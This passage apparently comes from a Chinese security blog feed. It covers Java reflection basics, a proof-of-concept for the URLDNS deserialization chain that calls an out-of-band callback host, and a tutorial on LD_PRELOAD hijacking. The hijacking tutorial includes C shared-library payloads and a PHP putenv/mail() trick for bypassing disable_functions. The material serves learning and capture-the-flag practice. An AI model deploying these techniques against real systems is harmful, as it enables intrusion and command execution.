class="line">        <span class="comment">//获得指定的方法</span></span><br><span class="line">        <span class="comment">//后面的参数类型可以用来判断  重载的方法</span></span><br><span class="line">        System.out.println(<span class="string">&quot;----------------------------&quot;</span>);</span><br><span class="line">        Method getname=aa.getMethod(<span class="string">&quot;getName&quot;</span>);</span><br><span class="line">        Method setname=aa.getMethod(<span class="string">&quot;setName&quot;</span>,String.class);</span><br><span class="line">        System.out.println(getname);</span><br><span class="line">        System.out.println(setname);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获得指定的构造器</span></span><br><span class="line">        System.out.println(<span class="string">&quot;----------------------------&quot;</span>);</span><br><span class="line">        Constructor[] constructors=aa.getConstructors();<span class="comment">//获得本类的方法</span></span><br><span class="line">        <span class="keyword">for</span>(Constructor c:constructors )&#123;</span><br><span class="line">            System.out.println(c);</span><br><span class="line">        &#125;</span><br><span class="line">        constructors=aa.getDeclaredConstructors();<span class="comment">//获得全部方法</span></span><br><span class="line">        <span class="keyword">for</span>(Constructor c:constructors )&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;##&quot;</span>+c);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//获得指定的构造器</span></span><br><span class="line">        Constructor constructor=aa.getConstructor(String.class);</span><br><span class="line">        System.out.println(constructor);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</blockquote>
<h4 id="有了Class对象，能做什么"><a href="#有了Class对象，能做什么" class="headerlink" title="有了Class对象，能做什么"></a>有了Class对象，能做什么</h4><p><img src="https://luokuang1.github.io/images/java6.png" width="60%" height="50%"></p>
<blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> reflection;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="comment">//动态的创建对象，通过反射</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">day8</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//获得Class对象</span></span><br><span class="line">        Class c1=Class.forName(<span class="string">&quot;reflection.test&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创造一个对象</span></span><br><span class="line">        test a=(test)c1.newInstance(); <span class="comment">//可以创造对象，本质上调用了无参构造器  如果没有就会报错</span></span><br><span class="line">        System.out.println(a);<span class="comment">//test&#123;name=&#x27;null&#x27;, age=0, id=0&#125;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//通过构造器创建对象</span></span><br><span class="line">        Constructor c2=c1.getDeclaredConstructor(String.class,<span class="type">int</span>.class);<span class="comment">//括号里面为其构造器的参数</span></span><br><span class="line">        Object c3=c2.newInstance(<span class="string">&quot;qqqqqq&quot;</span>,<span class="number">10</span>);  <span class="comment">//和上面的用法相同</span></span><br><span class="line">        System.out.println(c3);<span class="comment">//test&#123;name=&#x27;qqqqqq&#x27;, age=10, id=0&#125;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//通过反射调用普通方法</span></span><br><span class="line">        test a1=(test)c1.newInstance();</span><br><span class="line">        Method m1=c1.getDeclaredMethod(<span class="string">&quot;setName&quot;</span>,String.class);  <span class="comment">//获得一种方法</span></span><br><span class="line">        m1.invoke(a1,<span class="string">&quot;qwertyui&quot;</span>);</span><br><span class="line">        System.out.println(a1.getName());<span class="comment">//无参方法可以直接调用   输出qwertyui</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//通过反射来操作属性</span></span><br><span class="line">        test a2=(test)c1.newInstance();</span><br><span class="line">        Field f1=c1.getDeclaredField(<span class="string">&quot;age&quot;</span>);</span><br><span class="line">        <span class="comment">//不可以直接操作私有属性，需要我们关闭程序的安全检测,不然会报错</span></span><br><span class="line">        f1.set(a2,<span class="number">10</span>);</span><br><span class="line">        System.out.println(a2.getAge());</span><br><span class="line"></span><br><span class="line">        Field f2=c1.getDeclaredField(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">        f2.setAccessible(<span class="literal">true</span>);  <span class="comment">//通过方法属性或者方法的setAccessible(true)</span></span><br><span class="line">        f2.set(a2,<span class="string">&quot;qqqqqqqqq&quot;</span>);</span><br><span class="line">        System.out.println(a2.getName()); <span class="comment">//输出  qqqqqqqqq</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</blockquote>
<h4 id="反射操作泛型"><a href="#反射操作泛型" class="headerlink" title="反射操作泛型"></a>反射操作泛型</h4><blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> reflection;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Type;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="comment">//通过反射来获取泛型</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">day9</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test1</span><span class="params">(Map&lt;String,test&gt;map, List&lt;String&gt; list)</span>&#123;<span class="comment">//定义两个泛型参数</span></span><br><span class="line">        System.out.println(<span class="string">&quot;test1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> Map&lt;String,test&gt; <span class="title function_">test2</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;test2&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Method a1=day9.class.getMethod(<span class="string">&quot;test1&quot;</span>,Map.class,List.class);</span><br><span class="line">        Type[] generic=a1.getGenericParameterTypes();</span><br><span class="line">        <span class="keyword">for</span>(Type t:generic)&#123;</span><br><span class="line">            System.out.println(t);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</blockquote>
<h4 id="反射获取注解信息"><a href="#反射获取注解信息" class="headerlink" title="反射获取注解信息"></a>反射获取注解信息</h4><blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> reflection;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">day10</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Class q=Class.forName(<span class="string">&quot;reflection.students&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//通过反射来获取注解</span></span><br><span class="line">        Annotation[] annotations=q.getAnnotations();</span><br><span class="line">        <span class="keyword">for</span> (Annotation annotation : annotations) &#123;</span><br><span class="line">            System.out.println(annotation);<span class="comment">//@reflection.Tablekuang(name=&quot;qwerty&quot;)</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获得类指定的注解</span></span><br><span class="line">        Field qq=q.getDeclaredField(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">        Annotation w=qq.getAnnotation(Fieldkuang.class);</span><br><span class="line">        System.out.println(w);<span class="comment">//@reflection.Fieldkuang(age=12, name=&quot;string&quot;, id=10)</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">@Tablekuang(name=&quot;qwerty&quot;)</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">students</span> &#123;</span><br><span class="line">    <span class="meta">@Fieldkuang(age=12,name=&quot;int&quot;,id=10)</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line">    <span class="meta">@Fieldkuang(age=12,name=&quot;string&quot;,id=10)</span></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="meta">@Fieldkuang(age=12,name=&quot;int&quot;,id=10)</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> id;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setId</span><span class="params">(<span class="type">int</span> id)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.id = id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getId</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> id;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">@Target(ElementType.TYPE)</span></span><br><span class="line"><span class="meta">@Retention(RetentionPolicy.RUNTIME)</span></span><br><span class="line"><span class="meta">@interface</span> Tablekuang&#123;</span><br><span class="line">    String <span class="title function_">name</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">@Target(ElementType.FIELD)</span></span><br><span class="line"><span class="meta">@Retention(RetentionPolicy.RUNTIME)</span></span><br><span class="line"><span class="meta">@interface</span> Fieldkuang&#123;</span><br><span class="line">    String <span class="title function_">name</span><span class="params">()</span>;</span><br><span class="line">    <span class="type">int</span> <span class="title function_">age</span><span class="params">()</span>;</span><br><span class="line">    <span class="type">int</span> <span class="title function_">id</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</blockquote>
<h2 id="DNSlog链的复现"><a href="#DNSlog链的复现" class="headerlink" title="DNSlog链的复现"></a>DNSlog链的复现</h2><p>dnslog链一般用来测试是否存在序列化漏洞，它最终在序列化时会发送一条dns请求，它对环境很友好，限制较少，所以一般可以通过dnslog链来判断是否存在序列化漏洞</p>
<p>这里介绍一个工具，可以直接生成序列化后的文件，来触发漏洞</p>
<p><strong>deswing</strong>  这个工具对ysoserial进行了集成，使得页面可视化，将常见的利用链进行了封装</p>
<p>下载的地址：<a href="https://github.com/0ofo/Deswing">https://github.com/0ofo/Deswing</a></p>
<p>使用方法，可以直接点击jar包选择具体的链来进行导出即可</p>
<p>DNSlog的利用流程为：</p>
<blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">*HashMap.readObject()  //通过反序列化自动调用</span></span><br><span class="line"><span class="comment"> *HashMap.putVal()  </span></span><br><span class="line"><span class="comment">  *HashMap.hash()  //这里可以调用到key.hashCode()函数</span></span><br><span class="line"><span class="comment">   *URL.hashCode()  //这里可以发送一条dns请求</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
</blockquote>
<p>URL类中的hashCode中有一个代码：</p>
<blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (hashCode != -<span class="number">1</span>)  <span class="comment">//如果不为-1直接返回</span></span><br><span class="line">        <span class="keyword">return</span> hashCode;</span><br><span class="line"></span><br><span class="line">    hashCode = handler.hashCode(<span class="built_in">this</span>);<span class="comment">//否则调用函数重写计算了hashCode</span></span><br><span class="line">    <span class="keyword">return</span> hashCode;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</blockquote>
<p>跟进hashCode函数</p>
<blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">InetAddress</span> <span class="variable">addr</span> <span class="operator">=</span> getHostAddress(u);</span><br></pre></td></tr></table></figure>
</blockquote>
<p>这里获取了主机地址，从而发送dns请求，同时URL类是继承了serilized接口，所以，它可以被利用，就开始回推，看哪里可能可以调用URL.hashCode</p>
<p>然后就找到了HashMap类</p>
<blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">hash</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">    <span class="type">int</span> h; <span class="comment">//这里可以调用键的hashCode函数，如果key为URL类的话就可以调用hashCode函数</span></span><br><span class="line">    <span class="keyword">return</span> (key == <span class="literal">null</span>) ? <span class="number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="number">16</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</blockquote>
<p>现在就可以去寻找看HashMap中的hash函数在哪里被调用了</p>
<p>这里就发现了在HashMap重写了readObject，并且在readObject中就有关键一步</p>
<blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; mappings; i++) &#123;</span><br><span class="line">    <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">        <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> (K) s.readObject();<span class="comment">//这里将反序列化的键读取</span></span><br><span class="line">    <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">        <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> (V) s.readObject();<span class="comment">//这里将反序列化的值读取</span></span><br><span class="line">    putVal(hash(key), key, value, <span class="literal">false</span>, <span class="literal">false</span>);<span class="comment">//这里就调用了hash函数</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</blockquote>
<p>所以在HashMap函数中如果我们将URL类当做一个键传入时，可以做到触发dns请求，但是要注意在序列化之前确保传入的URL的hashcode的值为-1，不然就无法触发hashCode函数，这里就可以通过反射来进行获取，并修改</p>
<p>可能会导致失败的原因就是当java的版本太高可能将无法通过反射来获取和修改私有的属性导致其修改失败，建议在java9之下来做这个实验</p>
<p>具体的操作就是：</p>
<blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.HttpURLConnection;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">serialize</span> &#123;<span class="comment">//实现序列化的函数</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialized</span><span class="params">(Object oss)</span><span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(oss);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialized</span><span class="params">(String filename)</span><span class="keyword">throws</span> Exception&#123;<span class="comment">//实现反序列化的函数</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        <span class="keyword">return</span> ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://fexmpmw0vs3v4tofkt86osxh98f43vrk.oastify.com&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">hashCode</span> <span class="operator">=</span> URL.class.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);<span class="comment">//通过反射获得hashCode属性</span></span><br><span class="line">        hashCode.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        hashCode.setInt(url, <span class="number">100</span>);</span><br><span class="line">        HashMap&lt;URL,Object&gt; map=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(url,<span class="literal">null</span>);</span><br><span class="line">        hashCode.setInt(url, -<span class="number">1</span>);</span><br><span class="line">        serialized(map);</span><br><span class="line">        unserialized(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></blockquote>
]]></content>
      <tags>
        <tag>java基础 学习</tag>
      </tags>
  </entry>
  <entry>
    <title>浅谈LD_PRELOAD劫持</title>
    <url>/2024/08/16/%E6%B5%85%E8%B0%88LD-PRELOAD%E5%8A%AB%E6%8C%81/</url>
    <content><![CDATA[<p>相关的文章链接：<a href="https://www.cnblogs.com/sandeepin/p/ld-preload-inject.html">https://www.cnblogs.com/sandeepin/p/ld-preload-inject.html</a></p>
<p>首先介绍一下什么是LD_PRELOAD</p>
<p>LD_PRELOAD是一个环境变量，它允许你指定在程序启动之前需要预先加载（preload）的共享库（shared libraries）。当程序启动时，动态链接器（dynamic linker/loader）会首先加载这些通过<code>LD_PRELOAD</code>指定的库，然后才加载程序的其他依赖库。这可以用于拦截或修改程序的函数调用，实现诸如调试、性能分析、功能增强或替换原有库中的函数等目的。</p>
<p>这里就导致，如果我们在预先加载的库中写入危险命令就可以触发，一般的库都是以 .so 结尾，并且为c语言写的，需要将一个.c文件进行编译后生成一个共享库在将其设置为LD_PRELOAD默认的即可</p>
<p>这里有一个例子：</p>
<blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//首先创建一个 1234.c 是一个c语言生成随机数</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  srand(time(<span class="literal">NULL</span>));</span><br><span class="line">  <span class="type">int</span> i = <span class="number">10</span>;</span><br><span class="line">  <span class="keyword">while</span>(i--)</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, rand()%<span class="number">100</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//再创建一个 1111.c 让它返回固定的值</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">rand</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">42</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</blockquote>
<p>在kali中来进行编译执行：</p>
<blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">gcc ./<span class="number">1234.</span>c -o <span class="number">1234</span> <span class="comment">//将1234.c编译为一个可执行文件1234</span></span><br></pre></td></tr></table></figure>
</blockquote>
<p><img src="https://luokuang1.github.io/images/jiec1.png" width="95%" height="60%"></p>
<p>可以看到编译成功了，现在就可以执行，应该不出所料为10个随机数，下面就可以开始实验</p>
<blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">gcc -shared -fPIC <span class="number">1111.</span>c -o <span class="number">1111.</span>so <span class="comment">//将1111.c编译为一个共享库</span></span><br></pre></td></tr></table></figure>
</blockquote>
<p>现在就是去修改LD_PRELOAD默认的数据</p>
<blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">LD_PRELOAD=$PWD/<span class="number">1111.</span>so ./<span class="number">1234</span> <span class="comment">//这样就先当于在运行1234前动态加载1111.so，但下一次就不会了</span></span><br><span class="line">export LD_PRELOAD=$PWD/<span class="number">1111.</span>so <span class="comment">//这里就先当于设置了全局环境变量，对所有都有约束</span></span><br><span class="line">unset LD_PRELOAD  <span class="comment">//这个就可以恢复最初的</span></span><br></pre></td></tr></table></figure>
</blockquote>
<p><img src="https://luokuang1.github.io/images/jiec2.png" width="95%" height="60%"></p>
<p>这样就变为我们控制的值，相当于它加载的<strong>rand函数被调包了</strong>，调用成我们生成的1111.so中的rand函数，这样就可以实现控制</p>
<p>这里可以提供一个命令看看其执行时用于打印程序或者库文件所依赖的共享库列表</p>
<blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">ldd <span class="number">1234</span></span><br></pre></td></tr></table></figure>
</blockquote>
<p><img src="https://luokuang1.github.io/images/jiec3.png" width="95%" height="60%"></p>
<p>这里还有很多的例子，比如我们知道一个命令它会调用什么库，我们可以先进行拦截，最后在进行额外的操作这里也有一个实验，但是做法都一样,通过重写其中的一个函数来实现危险的方法调用</p>
<p>首先先确定其调用的函数，这里是通过ls命令为例子，其它的命令也是一样，在ls命令中就存在一个比较特殊的函数strncmp</p>
<blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">readelf -Ws /usr/bin/ls <span class="comment">//这样可以查找ls在调用时会调用哪些API </span></span><br><span class="line">readelf -Ws /usr/bin/ls|grep strncmp <span class="comment">//查看是否ls命令调用该函数</span></span><br></pre></td></tr></table></figure>
</blockquote>
<p>这里获取其strncmp的源码</p>
<blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">strncmp</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *s1, <span class="type">const</span> <span class="type">char</span> *s2, <span class="type">size_t</span> n)</span>  </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">while</span>(n &amp;&amp; *s1 &amp;&amp; *s2) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(*s1 != *s2)</span><br><span class="line">            <span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">char</span>)*s1 - (<span class="type">unsigned</span> <span class="type">char</span>)*s2;</span><br><span class="line">        s1++;</span><br><span class="line">        s2++;</span><br><span class="line">        n--;</span><br><span class="line">    &#125;</span><br><span class="line">   </span><br><span class="line">    <span class="keyword">if</span>(!n)  </span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(*s1)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span>(*s1 == *s2 )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</blockquote>
<p>函数的原型，这里如果要进行重写就要确保函数的参数相同不然就可能报错，从而实验不成功</p>
<blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">payload</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;hello i am haker!!!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">strncmp</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *s1, <span class="type">const</span> <span class="type">char</span> *s2, <span class="type">size_t</span> n)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (getenv(<span class="string">&quot;LD_PRELOAD&quot;</span>) == <span class="literal">NULL</span>) &#123; </span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    unsetenv(<span class="string">&quot;LD_PRELOAD&quot;</span>);</span><br><span class="line">    payload();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">getenv <span class="comment">//用于从环境变量中取字符串，即获取环境变量的值</span></span><br><span class="line">putenv <span class="comment">//用于改变或增加环境变量的内容。在C语言中，putenv函数接受一个格式为name=value的字符串，如果该环境变量已存在，则更新其值；如果不存在，则添加该环境变量。</span></span><br><span class="line">setenv <span class="comment">//是putenv的一个更安全的替代品，因为它允许指定是否覆盖已存在的环境变量，并且不会修改传入的字符串。</span></span><br><span class="line">unsetenv  <span class="comment">//用于删除指定的环境变量。</span></span><br></pre></td></tr></table></figure>
</blockquote>
<p>这里就可以在执行ls命令时输出hello i am haker!!!，当然在这里我们也可以来执行危险函数,只需修改payload里面的内容即可</p>
<p><img src="https://luokuang1.github.io/images/jiec4.png" width="95%" height="60%"></p>
<p>这里还有一个用途，通过attribute来进行LD_PRELOAD劫持</p>
<p>GCC 有个 C 语言扩展修饰符 attribute((constructor))，可以让由它修饰的函数在 main() 之前执行，一旦某些指令需要加载动态链接库时，就会立即执行它</p>
<blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line">__attribute__ ((__constructor__)) <span class="type">void</span> <span class="title function_">preload</span> <span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    unsetenv(<span class="string">&quot;LD_PRELOAD&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;i am hacker!!\n&quot;</span>);  <span class="comment">//这里可以进行修改</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</blockquote>
<p><img src="https://luokuang1.github.io/images/jiec5.png" width="95%" height="60%"></p>
<p>可以看到所有的命令执行都触发了危险的函数</p>
<p>最后就是通过LD_PRELOAD劫持来绕过Disable_Functions</p>
<p>在有些时候就会出现，我们没有办法读取通过命令来执行读取flag的操作就可以试试LD_PRELOAD劫持来实现命令读取，具体也是一样，一般步骤都是一样的，但是需要执行 这个修改LD_PRELOAD的语句有点难，一般就是通过php文件包含来实现，通过php代码来实现这个操作</p>
<p>export LD_PRELOAD=$PWD/1111.so 再配合你所写的.so文件即可</p>
<p>php文件里面我还是推荐统一的写法，通过执行php文件里面的内容就可以修改环境，但是要先有这个文件，还有需要注意的一点就是该文件是由权限访问的，所以就需要我们将它放置在tmp目录下最好</p>
<blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="title function_">putenv</span><span class="params">(<span class="string">&quot;LD_PRELOAD=/var/tmp/1222.so&quot;</span>)</span>;</span><br><span class="line">mail(<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>);</span><br><span class="line">error_log(<span class="string">&quot;&quot;</span>,<span class="number">1</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
</blockquote>
<p>.so文件的内容，就可以自己选择，通过上面的方法，但是还是推荐最后一个，因为它可以在任意命令执行前进行执行</p>
<blockquote>
